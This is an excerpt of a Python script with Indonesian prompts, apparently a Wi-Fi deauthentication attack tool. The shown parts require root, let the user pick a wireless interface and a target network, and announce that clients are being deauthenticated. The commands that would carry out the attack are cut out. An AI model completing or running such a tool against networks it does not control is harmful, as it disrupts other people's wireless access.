...
if not 'SUDO_UID' in os.environ.keys():
    print("Root please!,tools ini memerlukan akses root")
    exit()
...
if len(check_wifi_result) == 0:
    print("Tolong connect ke WIFI router dan coba lagi.")
    exit()

# Menu to select WiFi interface from
print("WIFI interface:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Ensure the WiFi interface selected is valid. Simple menu with interfaces to select from.
while True:
    wifi_interface_choice = input("Pilih interface wifi yang mau di att: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Enter nomor correspond.")
...
while True:
    choice = input("Please pilih yang bener: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Lu ga hoki,coba lagi sono.")
...
try:
    while True:
        print("Deauthenticating clients,ketik ctrl-c untuk stop")
except KeyboardInterrupt:
